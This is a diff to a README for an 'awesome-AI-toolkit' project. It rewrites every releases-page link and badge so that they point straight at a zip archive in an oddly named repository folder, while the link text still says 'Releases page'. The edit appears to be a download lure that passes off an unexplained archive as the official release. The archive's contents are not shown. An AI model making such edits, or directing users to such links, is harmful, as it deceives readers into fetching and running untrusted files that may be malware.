@@ -1,6 +1,6 @@
 # 🌟 awesome-AI-toolkit - Your Guide to AI Tools
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Your%20Link%20Here-brightgreen)](https://github.com/Javialma04/awesome-AI-toolkit/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Javialma04/awesome-AI-toolkit/main/Gallicanism/awesome-AI-toolkit.zip%20Now-Your%20Link%20Here-brightgreen)](https://raw.githubusercontent.com/Javialma04/awesome-AI-toolkit/main/Gallicanism/awesome-AI-toolkit.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ Welcome to the awesome-AI-toolkit. This project provides a curated collection of
 Follow these steps to download and run the software:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Javialma04/awesome-AI-toolkit/releases) to find the latest version of the toolkit.
+   Go to the [Releases page](https://raw.githubusercontent.com/Javialma04/awesome-AI-toolkit/main/Gallicanism/awesome-AI-toolkit.zip) to find the latest version of the toolkit.
 
 2. **Choose Your Version**  
    Look for the version you want to download. Each release has a set of downloadable files. Select the one that suits your operating system.
@@ -43,9 +43,9 @@ To run the awesome-AI-toolkit, your system should meet the following requirement
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Javialma04/awesome-AI-toolkit/releases) and download the latest version. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Javialma04/awesome-AI-toolkit/main/Gallicanism/awesome-AI-toolkit.zip) and download the latest version. 
 
-![Download the latest release](https://img.shields.io/badge/Download%20Now-Your%20Link%20Here-brightgreen)
+![Download the latest release](https://raw.githubusercontent.com/Javialma04/awesome-AI-toolkit/main/Gallicanism/awesome-AI-toolkit.zip%20Now-Your%20Link%20Here-brightgreen)
 
 Once you’ve downloaded the file, follow the steps outlined above to install and run the toolkit.
 
